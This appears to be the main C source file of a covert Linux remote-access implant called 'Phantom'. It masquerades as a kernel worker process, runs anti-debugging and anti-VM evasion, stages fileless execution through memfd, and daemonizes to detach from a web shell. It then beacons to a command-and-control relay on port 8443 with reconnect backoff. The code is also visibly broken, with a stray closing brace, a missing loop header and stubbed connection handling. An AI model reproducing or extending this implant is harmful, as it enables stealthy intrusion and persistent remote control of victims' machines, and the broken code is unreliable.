#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/prctl.h>
#include "phantom.h"
#include "network_core.h"
#include "stealth.h"
#include "memfd_loader.h"
#include "utils.h"

#define PHANTOM_VERSION "v1.0.1-stable"

// NO ANSI COLORS - Plain text for web shells
#define DPRINTF_FLUSH(fmt, ...) do { \
    dprintf(STDERR_FILENO, fmt, ##__VA_ARGS__); \
    fsync(STDERR_FILENO); \
} while (0)

static void usage(const char *progname) {
    DPRINTF_FLUSH("Usage: %s -s <secret> [-i <host>] [-m <port>] [-d]\n", progname);
}

int main(int argc, char *argv[]) {
    // 1. Principal Masquerading
    full_masquerade(argv, argc);

    char *secret = NULL;
    char *relay_host = NULL;
    char *relay_port_str = NULL;
    int daemon_mode = 0;

    int opt;
    while ((opt = getopt(argc, argv, "s:i:m:d")) != -1) {
        switch (opt) {
            case 's': secret = strdup(optarg); break;
            case 'i': relay_host = strdup(optarg); break;
            case 'm': relay_port_str = strdup(optarg); break;
            case 'd': daemon_mode = 1; break;
            default: usage(argv[0]); return 1;
        }
    }

    if (secret == NULL) {
        DPRINTF_FLUSH("[ERROR] Secret key (-s) is mandatory for agent initialization\n");
        return 1;
    }
    if (relay_host == NULL) relay_host = strdup(DEFAULT_C2_HOST);
    if (relay_port_str == NULL) relay_port_str = strdup("8443");

    uint16_t relay_port = (uint16_t)atoi(relay_port_str);

    // 2. Network Debug Output (BEFORE forking)
    DPRINTF_FLUSH("[-] C2 Target: %s:%d\n", relay_host, relay_port);
    DPRINTF_FLUSH("[-] Resolving %s...\n", relay_host);
    DPRINTF_FLUSH("[-] Initializing Stealth Payload...\n");

    // Evasion: Anti-VM & Stalling Logic
    if (ph_stealth_anti_debug_comprehensive() != PH_STEALTH_OK) {
        _exit(0);
    }


    // Fileless Execution Staging
    ph_memfd_ctx_t memfd_ctx;
    if (ph_memfd_init(&memfd_ctx) != PH_OK) {
        DPRINTF_FLUSH("STAGE_FAIL: memfd context initialization failed\n");
    }

    // Execution Detachment
    if (daemon_mode) {
        DPRINTF_FLUSH("[-] Detaching from Web Session...\n");
        pid_t pid = fork();
        if (pid < 0) {
            DPRINTF_FLUSH("[ERROR] Fork failed: %s\n", strerror(errno));
            return 1;
        }
        if (pid > 0) {
            _exit(0);
        }
        if (setsid() < 0) {
            DPRINTF_FLUSH("[ERROR] setsid failed: %s\n", strerror(errno));
            return 1;
        }
        signal(SIGHUP, SIG_IGN);
        pid = fork();
        if (pid > 0) _exit(0);

        DPRINTF_FLUSH("[+] Process Forked: %s\n", kworker_name);
        DPRINTF_FLUSH("[+] Deployment Success\n");
    } else {
        DPRINTF_FLUSH("[+] Deployment Success (Foreground Mode)\n");
    }

    // Core Network Loop with Exponential Backoff
    ph_network_ctx_t net_ctx;
    if (ph_network_init(&net_ctx) != PH_OK) {
        DPRINTF_FLUSH("[ERROR] Network context initialization failed\n");
        sleep(5);
    }

    ph_relay_manager_add(&net_ctx.relay_mgr, relay_host, relay_port, 1);

        int ret = ph_network_connect_with_fallback(&net_ctx, relay_host);
        if (ret == PH_OK) {
            DPRINTF_FLUSH("[+] Agent Online (%s).\n", PHANTOM_VERSION);
            ph_reconnect_reset(&net_ctx.reconnect);

            
            // Handle connection...
        } else {
            DPRINTF_FLUSH("[!] All C2 ports failed, retrying in backoff...\n");
        }

        ph_reconnect_attempt(&net_ctx.reconnect);
    }


    return 0;
}
